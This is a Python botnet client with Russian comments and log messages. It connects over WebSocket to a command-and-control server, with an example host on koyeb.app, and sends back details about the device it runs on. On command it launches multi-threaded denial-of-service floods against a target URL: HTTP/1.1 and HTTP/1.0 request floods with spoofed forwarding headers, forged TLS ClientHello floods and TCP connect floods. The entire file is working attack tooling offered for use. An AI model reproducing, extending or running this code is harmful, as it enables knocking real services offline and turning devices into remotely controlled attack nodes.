#!/usr/bin/env python3
# c2_client.py — WebSocket-клиент
# Запуск: python c2_client.py <host> [port]
# Пример: python c2_client.py neon-c2-icevpn1488.koyeb.app 443

import asyncio
import aiohttp
import socket
import ssl
import threading
import random
import time
import sys
import os
import json
import struct
import platform
import multiprocessing
from urllib.parse import urlparse

C2_HOST = ""    # пусто → берётся из аргументов
C2_PORT = 443
USE_SSL = True
RECONNECT_DELAY = 5

PATHS = ["/", "/index.html", "/api", "/api/v1", "/login", "/wp-login.php",
         "/admin", "/search", "/feed", "/sitemap.xml", "/robots.txt", "/.env"]

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
]
METHODS = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]

def log(msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)

def rand_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def rand_token(n):
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(n))

def rand_path():
    return f"{random.choice(PATHS)}?{rand_token(random.randint(8, 64))}"

def rand_sni():
    return f"cdn-{rand_token(6).lower()}.com"

def build_request(method, host, path, http11=True):
    extra = ""; body = b""
    if method in ("POST", "PUT"):
        blen = random.randint(64, 1024)
        body = rand_token(blen).encode()
        extra = f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n"
    ver = "HTTP/1.1" if http11 else "HTTP/1.0"
    req = (
        f"{method} {path} {ver}\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {random.choice(UAS)}\r\n"
        f"Accept: */*\r\n"
        f"Accept-Language: en-US,en;q=0.9\r\n"
        f"Connection: {'keep-alive' if http11 else 'close'}\r\n"
        f"X-Forwarded-For: {rand_ip()}\r\n"
        f"X-Real-IP: {rand_ip()}\r\n"
        f"{extra}"
        f"\r\n"
    ).encode()
    return req + body

def build_clienthello(sni):
    sni_b = sni.encode()
    sni_entry = struct.pack(">H", len(sni_b)+3) + b"\x00" + struct.pack(">H", len(sni_b)) + sni_b
    sni_ext = struct.pack(">H", 0x0000) + struct.pack(">H", len(sni_entry)) + sni_entry
    groups = struct.pack(">H",0x000a)+struct.pack(">H",12)+struct.pack(">H",6)+b"\x00\x1d\x00\x17\x00\x18\x00\x19"
    ecpf = struct.pack(">H",0x000b)+struct.pack(">H",2)+b"\x01\x00"
    sig = b"".join(struct.pack(">H",x) for x in [0x0403,0x0503,0x0603,0x0804,0x0805,0x0806])
    sigalgs = struct.pack(">H",0x000d)+struct.pack(">H",len(sig)+2)+struct.pack(">H",len(sig))+sig
    sup_ver = struct.pack(">H",0x002b)+struct.pack(">H",3)+b"\x02\x03\x04"
    ks_data = b"\x00\x1d"+struct.pack(">H",32)+bytes(random.randint(0,255) for _ in range(32))
    keyshare = struct.pack(">H",0x0033)+struct.pack(">H",len(ks_data)+2)+struct.pack(">H",len(ks_data))+ks_data
    ext = sni_ext+groups+ecpf+sigalgs+sup_ver+keyshare
    exts_b = struct.pack(">H",len(ext))+ext
    ciphers = b"".join(struct.pack(">H",c) for c in [0x1301,0x1302,0x1303,0xc02b,0xc02f,0xc02c,0xc030,0xcca9,0xcca8])
    ciphers_b = struct.pack(">H",len(ciphers))+ciphers
    sid = bytes([32])+bytes(random.randint(0,255) for _ in range(32))
    rand = bytes(random.randint(0,255) for _ in range(32))
    body = b"\x03\x03"+rand+sid+ciphers_b+b"\x01\x00"+exts_b
    hs = b"\x01"+struct.pack(">I",len(body))[1:]+body
    return b"\x16\x03\x01"+struct.pack(">H",len(hs))+hs

def connect_target(host, port, use_ssl, ctx_cache):
    try:
        s = socket.create_connection((host, port), timeout=5)
        try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception: pass
        if use_ssl:
            ctx = ctx_cache.get("ctx")
            if ctx is None:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                try: ctx.minimum_version = ssl.TLSVersion.TLSv1_2
                except Exception: pass
                ctx_cache["ctx"] = ctx
            s = ctx.wrap_socket(s, server_hostname=host)
        s.settimeout(3)
        return s
    except Exception:
        return None

def http1_worker(host, port, use_ssl, stats, stop_evt, mode, ctx_cache):
    sock = None
    while not stop_evt.is_set():
        if sock is None:
            sock = connect_target(host, port, use_ssl, ctx_cache)
            if sock is None:
                stats["errors"] += 1; time.sleep(0.02); continue
        try:
            buf = bytearray()
            for _ in range(5):
                m = random.choice(["POST","PUT"]) if mode == "heavy" else random.choice(METHODS)
                buf += build_request(m, host, rand_path())
            sock.sendall(buf)
            stats["requests"] += 5
            try:
                data = sock.recv(16384)
                if data: stats["bytes"] += len(data)
            except socket.timeout: pass
            except Exception: pass
        except Exception:
            try: sock.close()
            except Exception: pass
            sock = None; stats["errors"] += 1
    if sock:
        try: sock.close()
        except Exception: pass

def http10_worker(host, port, use_ssl, stats, stop_evt, ctx_cache):
    while not stop_evt.is_set():
        s = connect_target(host, port, use_ssl, ctx_cache)
        if s is None: stats["errors"] += 1; continue
        try:
            s.sendall(build_request("GET", host, rand_path(), http11=False))
            stats["requests"] += 1
            try:
                s.settimeout(1)
                data = s.recv(4096)
                if data: stats["bytes"] += len(data)
            except Exception: pass
        except Exception: stats["errors"] += 1
        finally:
            try: s.close()
            except Exception: pass

def tls_worker(host, port, stats, stop_evt):
    while not stop_evt.is_set():
        s = None
        try:
            s = socket.create_connection((host, port), timeout=4)
            try: s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            except Exception: pass
            s.sendall(build_clienthello(rand_sni()))
            stats["requests"] += 1
            try:
                s.settimeout(1.5)
                data = s.recv(4096)
                if data: stats["bytes"] += len(data)
            except Exception: pass
        except Exception: stats["errors"] += 1
        finally:
            if s:
                try: s.close()
                except Exception: pass

def syn_worker(host, port, stats, stop_evt):
    try: resolved = socket.gethostbyname(host)
    except Exception: resolved = host
    while not stop_evt.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            try: s.connect_ex((resolved, port))
            except Exception: pass
            stats["requests"] += 1
            try: s.close()
            except Exception: pass
        except Exception: stats["errors"] += 1

def universal_worker(host, port, use_ssl, stats, stop_evt, mode, vectors, ctx_cache):
    while not stop_evt.is_set():
        try:
            v = random.choice(vectors)
            if v == "http1": http1_worker(host, port, use_ssl, stats, stop_evt, mode, ctx_cache)
            elif v == "http10": http10_worker(host, port, use_ssl, stats, stop_evt, ctx_cache)
            elif v == "tls": tls_worker(host, port, stats, stop_evt)
            elif v == "syn": syn_worker(host, port, stats, stop_evt)
        except Exception:
            stats["errors"] += 1; time.sleep(0.05)

class AttackWorker(threading.Thread):
    def __init__(self, host, port, use_ssl, mode, vectors, stats, stop_evt, ctx_cache):
        super().__init__(daemon=True)
        self.host=host; self.port=port; self.use_ssl=use_ssl
        self.mode=mode; self.vectors=vectors
        self.stats=stats; self.stop_evt=stop_evt; self.ctx_cache=ctx_cache
    def run(self):
        universal_worker(self.host, self.port, self.use_ssl, self.stats,
                         self.stop_evt, self.mode, self.vectors, self.ctx_cache)

def get_device_info():
    hostname = ""
    try: hostname = socket.gethostname()
    except Exception: pass
    if hostname.lower() in ("localhost","127.0.0.1",""):
        try:
            with open("/proc/sys/kernel/hostname") as f:
                h = f.read().strip()
                if h: hostname = h
        except Exception: pass
    if hostname.lower() in ("localhost","127.0.0.1",""):
        hostname = os.environ.get("HOSTNAME") or os.environ.get("USER") or "device"

    try:
        system = platform.system() or "unknown"
        release = platform.release() or ""
        machine = platform.machine() or ""
    except Exception:
        system = release = machine = "?"

    android_model=""; android_version=""; android_sdk=""; android_brand=""
    try:
        if os.path.exists("/system/build.prop"):
            with open("/system/build.prop") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("ro.product.model="): android_model = line.split("=",1)[1].strip()
                    elif line.startswith("ro.product.brand="): android_brand = line.split("=",1)[1].strip()
                    elif line.startswith("ro.build.version.release="): android_version = line.split("=",1)[1].strip()
                    elif line.startswith("ro.build.version.sdk="): android_sdk = line.split("=",1)[1].strip()
    except Exception: pass

    try: cpu = multiprocessing.cpu_count()
    except Exception: cpu = 0

    ram_mb = 0
    try:
        if os.path.exists("/proc/meminfo"):
            with open("/proc/meminfo") as f:
                for line in f:
                    if line.startswith("MemTotal:"):
                        ram_mb = int(line.split()[1]) // 1024; break
    except Exception: pass

    is_android = "android" in system.lower() or (system.lower()=="linux" and os.path.exists("/system/build.prop")) or android_model != ""

    if is_android:
        display_os = f"Android {android_version}" if android_version else "Android"
        if android_sdk: display_os += f" (SDK {android_sdk})"
        display_name = android_model or hostname
        if android_brand and android_brand.lower() not in display_name.lower():
            display_name = f"{android_brand} {display_name}".strip()
    else:
        display_os = f"{system} {release}".strip()
        display_name = hostname

    return {"hostname": hostname, "display_name": display_name, "os": display_os,
            "cpu": cpu, "ram_mb": ram_mb, "is_android": is_android,
            "machine": machine, "python": platform.python_version()}

attack_state = {"workers": [], "stop_evt": None, "stats": None, "timer": None}
C2_WS = {"ws": None, "lock": threading.Lock(), "loop": None}

def send_log_async(msg, level="info"):
    with C2_WS["lock"]:
        ws = C2_WS["ws"]; loop = C2_WS["loop"]
    if ws is None or loop is None: return
    try:
        asyncio.run_coroutine_threadsafe(
            ws.send_json({"cmd": "log", "level": level, "msg": msg}), loop)
    except Exception: pass

def run_attack(url, threads, duration, mode):
    if attack_state["timer"] and attack_state["timer"].is_alive():
        send_log_async("атака уже идёт", "warn"); return
    try:
        target = urlparse(url)
        if not target.hostname: raise ValueError
    except Exception:
        send_log_async(f"плохой адрес: {url}", "error"); return

    use_ssl = target.scheme == "https"
    port = target.port or (443 if use_ssl else 80)
    vectors = ["http1", "http10", "syn"]
    if use_ssl: vectors.append("tls")

    stats = {"requests": 0, "errors": 0, "bytes": 0}
    stop_evt = threading.Event()
    ctx_cache = {}
    workers = []
    for _ in range(threads):
        w = AttackWorker(target.hostname, port, use_ssl, mode, vectors, stats, stop_evt, ctx_cache)
        w.start(); workers.append(w)

    attack_state["workers"] = workers
    attack_state["stop_evt"] = stop_evt
    attack_state["stats"] = stats
    send_log_async(f"▶ АТАКА — {target.hostname}:{port} | потоков {threads} | {duration}с", "attack")

    def timer():
        deadline = time.time() + duration
        last = time.time()
        while time.time() < deadline and not stop_evt.is_set():
            time.sleep(1)
            if time.time() - last >= 10:
                send_log_async(f"  запр: {stats['requests']:,} | ош: {stats['errors']:,} | трафик: {stats['bytes']/1024/1024:.1f} МБ", "info")
                last = time.time()
        stop_evt.set()
        send_log_async(f"■ ЗАВЕРШЕНО — запр: {stats['requests']:,} | ош: {stats['errors']:,} | трафик: {stats['bytes']/1024/1024:.2f} МБ", "ok")

    t = threading.Thread(target=timer, daemon=True)
    t.start(); attack_state["timer"] = t

def stop_attack():
    evt = attack_state.get("stop_evt")
    if evt:
        evt.set()
        send_log_async("атака остановлена", "stop")

async def run_client(host, port, use_ssl):
    info = get_device_info()
    log(f"устройство: {info['display_name']} | {info['os']} | ядер: {info['cpu']}")
    proto = "wss" if use_ssl else "ws"
    url = f"{proto}://{host}/ws/client" if port in (80, 443) else f"{proto}://{host}:{port}/ws/client"
    log(f"целевой сервер: {url}")

    async with aiohttp.ClientSession() as session:
        while True:
            log("подключение...")
            try:
                ws = await session.ws_connect(url, heartbeat=30, timeout=15)
            except Exception as e:
                log(f"не удалось: {e}, повтор через {RECONNECT_DELAY}с")
                await asyncio.sleep(RECONNECT_DELAY); continue

            loop = asyncio.get_running_loop()
            with C2_WS["lock"]:
                C2_WS["ws"] = ws; C2_WS["loop"] = loop

            await ws.send_json({"cmd": "hello", **info})
            try:
                msg = await asyncio.wait_for(ws.receive_json(), timeout=10)
            except Exception:
                msg = None

            if not msg or msg.get("cmd") != "hello":
                log("неверное рукопожатие")
                try: await ws.close()
                except Exception: pass
                with C2_WS["lock"]: C2_WS["ws"] = None
                await asyncio.sleep(RECONNECT_DELAY); continue

            cid = msg.get("id", "?")
            log(f"✓ подключено как устройство #{cid}")
            await ws.send_json({"cmd": "ready"})

            async def sender():
                while not ws.closed:
                    try:
                        await asyncio.sleep(3)
                        await ws.send_json({"cmd": "ping"})
                        s = attack_state.get("stats")
                        if s and attack_state["timer"] and attack_state["timer"].is_alive():
                            await ws.send_json({"cmd": "stats", "stats": dict(s)})
                    except Exception: break

            sender_task = asyncio.create_task(sender())
            try:
                async for msg in ws:
                    if msg.type == aiohttp.WSMsgType.TEXT:
                        try: data = json.loads(msg.data)
                        except Exception: continue
                        c = data.get("cmd")
                        if c == "attack":
                            threading.Thread(target=run_attack,
                                args=(data.get("url"), data.get("threads", 50),
                                      data.get("duration", 60), data.get("mode", "heavy")),
                                daemon=True).start()
                        elif c == "stop": stop_attack()
                        elif c == "ping": await ws.send_json({"cmd": "pong"})
                        elif c == "pong": pass
                        elif c == "die":
                            log("отключение по команде"); stop_attack()
                            await ws.close(); sys.exit(0)
            except Exception as e:
                log(f"ошибка соединения: {e}")
            finally:
                sender_task.cancel()

            with C2_WS["lock"]: C2_WS["ws"] = None
            try: await ws.close()
            except Exception: pass
            log(f"сервер отключился, повтор через {RECONNECT_DELAY}с")
            await asyncio.sleep(RECONNECT_DELAY)

def main():
    host = C2_HOST; port = C2_PORT
    if len(sys.argv) >= 2: host = sys.argv[1]
    if len(sys.argv) >= 3:
        try: port = int(sys.argv[2])
        except Exception: pass
    if not host:
        print("использование: python c2_client.py <host> [port]")
        print("пример: python c2_client.py neon-c2-icevpn1488.koyeb.app 443")
        sys.exit(1)
    asyncio.run(run_client(host, port, USE_SSL))

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: log("прервано")